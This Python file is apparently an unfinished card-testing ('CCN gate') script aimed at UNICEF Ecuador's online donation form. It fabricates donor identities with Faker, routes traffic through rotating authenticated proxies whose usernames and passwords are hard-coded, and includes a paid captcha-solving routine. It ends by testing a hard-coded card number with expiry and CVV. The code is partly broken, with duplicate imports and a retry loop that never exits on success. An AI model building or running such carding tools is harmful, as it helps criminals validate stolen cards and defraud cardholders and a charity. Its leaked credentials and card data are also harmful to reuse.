import ast
import email
from email import message
from tarfile import data_filter
import random, time
from faker import Faker
from random import choice
from tkinter import LAST, Tk, filedialog
from httpx import TooManyRedirects, request
import requests,re
from bs4 import BeautifulSoup as b
from bs4 import BeautifulSoup
#from hh import keep_alive
import requests
import json, string, re
import requests
import time
import json
import random, time
from faker import Faker
from random import choice
import asyncio
import requests
from bs4 import BeautifulSoup
import requests
import re
from bs4 import BeautifulSoup as b
from curl_cffi import requests
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
import json
import cloudscraper


def usuario() -> dict:
    number = random.randint(1111, 9999)
    postal = random.choice(['10080', '14925', '71601', '86556', '19980'])
    return { 'name' : Faker().name(), 'email' : Faker().email().replace('@', '{}@'.format(number)), 'username' : Faker().user_name(), 'phone' : '512678{}'.format(number), 'city' : Faker().city(), 'code' : postal }


def capture(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def get_random_proxy(file_path="proxys.txt"):
    with open(file_path, "r") as f:
        proxies = f.readlines()
    
    proxy = random.choice(proxies).strip()  # Elegir un proxy aleatorio
    host_port, user_pass = proxy.split("@")  # Separar IP y usuario:contraseña
    host, port = host_port.split(":")  # Separar IP y puerto
    user, password = user_pass.split(":")  # Separar usuario y contraseña
    
    return host, port, user, password
async def resolver_captcha(api_key, sitekey, url):
    data = {
        'clientKey': api_key,
        'task': {
            'type': 'NoCaptchaTaskProxyless',
            'websiteURL': url,
            'websiteKey': sitekey
        }
    }
    try:
        response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/createTask', json=data)
        result = response.json()

        if 'errorId' in result and result['errorId'] == 0:
            task_id = result['taskId']
            
            # Esperar a que se resuelva el captcha
            while True:
                await asyncio.sleep(5)
                response = await asyncio.to_thread(requests.post, 'http://api.anti-captcha.com/getTaskResult', json={'clientKey': api_key, 'taskId': task_id})
                if response.json()['status'] == 'ready':
                    return response.json()['solution']['gRecaptchaResponse']
        else:
            raise Exception('Error en la API de anti-captcha')

    except Exception as e:
        raise Exception(f'Error al resolver el captcha: {str(e)}')
    
def generar_numero_usa():
    area_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    central_office_code = random.randint(200, 999)  # NXX (sin incluir 0 o 1 como primer dígito)
    line_number = random.randint(1000, 9999)  # XXXX
    
    return f"({area_code})-{central_office_code}-{line_number}"

def print_all_texts(data):
    if isinstance(data, dict):
        # Si existe una clave 'value' que contiene una lista
        if "value" in data and isinstance(data["value"], list):
            for value_item in data["value"]:
                if isinstance(value_item, dict) and "text" in value_item:
                    print(value_item["text"])
        # Continuar buscando en otros niveles
        for key, value in data.items():
            print_all_texts(value)

    elif isinstance(data, list):
        for item in data:
            print_all_texts(item)


def ccn_gate(card):
    max_retries = 15
    retry_count = 0
    while retry_count < max_retries:
        try:
            #============[Funcions Need]============#
            c = requests.Session()

            # Definir las credenciales del proxy y la URL
            proxy_url = 'http://proxy.soax.com:5000'
            proxy_user = 'package-265377-country-mx'
            proxy_pass = '589UEf1c4AXLjJ2M'

            # Configurar el proxy con autenticación
            #c.proxies = {
            #    'http': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000',
             #   'https': f'http://{proxy_user}:{proxy_pass}@proxy.soax.com:5000'
            #}

            # Desactivar la verificación SSL (equivalente al -k de curl)
            #c.verify = False

            # Permitir redirecciones (equivalente al -L de curl)
            #c.max_redirects = 10
            
            
            cc_number, mes, ano_number, cvv = card.split('|')
            if len(ano_number) == 2: ano_number = "20"+ano_number
            agente_user = UserAgent()
            proxy_host, proxy_port, proxy_user, proxy_pass = get_random_proxy()
            proxy = "geo.iproyal.com:12321"  # SIN "http://"
            proxy_auth = "rTPt8eauWJNOjdno:BUo3nBhOfK3TV3vt_country-us"

            proxys={"server": f"http://{proxy_host}:{proxy_port}"}

            #============[Address Found]============#
            name  = usuario()['name'].split(' ')[0]
            last  = usuario()['name'].split(' ')[1]
            email = usuario()['email']
            number = random.randint(1111, 9999)
            street = f"{name} street {number}"
            phone = usuario()['phone']
           

            #============[Requests 1]============#
            headers = {
                'authority': 'unicef.org.ec',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                # 'cookie': 'visid_incap_3099825=Nv8nx0oHRoiFpRhPydKfIlWZ9WcAAAAAQUIPAAAAAAB2lJZycLPULSDbwl+xGkDn; incap_ses_1836_3099825=z1avGOB4KU/VBB1Zgsh6GVaZ9WcAAAAArd1i4bnrv/pPrvPRvIFOww==; _gcl_au=1.1.350710902.1744148824; _gid=GA1.3.1090386113.1744148825; _gat_UA-18677177-1=1; _ga=GA1.1.1753159151.1744148825; _tt_enable_cookie=1; _ttp=01JRBNY0KKEKE3GH20HB049ZK4_.tt.2; _fbp=fb.2.1744148824803.815569609553736350; _hjSessionUser_1435453=eyJpZCI6IjJhZDUzZWE5LWM4ZWMtNWMwYi04Y2VjLTNlZGRkZmQxNmVmNCIsImNyZWF0ZWQiOjE3NDQxNDg4MjQ5MjgsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_1435453=eyJpZCI6IjllNGFlNGM3LTkxNDktNDEzNi1iYTI0LWE3ZDQ2ODY3ZGVkNCIsImMiOjE3NDQxNDg4MjQ5MjksInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MH0=; ttcsid_CH05I13C77UEVB23FFOG=1744148824693.1.1744148845890; ttcsid=1744148824694.1.1744148845890; _ga_RQ0S2N00JT=GS1.1.1744148824.1.1.1744148845.39.0.0',
                'origin': 'https://unicef.org.ec',
                'pragma': 'no-cache',
                'referer': 'https://unicef.org.ec/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            params = {
                'page': 'datos_contacto',
            }

            data = {
                'tipo_donacion': 'recurrente',
                'valor_donacion[radios]': '6',
                'valor_donacion[other]': '',
                'donacion_computed': '6',
                'utm_medium': '',
                'utm_campaign': '',
                'utm_content': '',
                'utm_source': '',
                'utm_term': '',
                'utm_default': 'https://unicef.org.ec/node/19',
                'fuid': '19',
                'tipo_monto': 'fixed',
                'op': 'QUIERO DONAR',
                'antibot_key': 'GK5Kw1UhBCqRloRgkM0fpovAK6FsfF80SBdQyBfyrfw',
                'form_build_id': 'form-bjjt0tWeLurkaTiu3BZ2gyaT_L9zjBNNFE2PXTgvGAg',
                'form_id': 'webform_submission_multi_step_lead_paragraph_2_add_form',
                'url': '',
            }

            response = c.post('https://unicef.org.ec/', params=params,  headers=headers, data=data)

            
                                    
            


            
            print("Status Code:", response.status_code)
           

          

                    
           
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5456080071103691|04|2028|524"))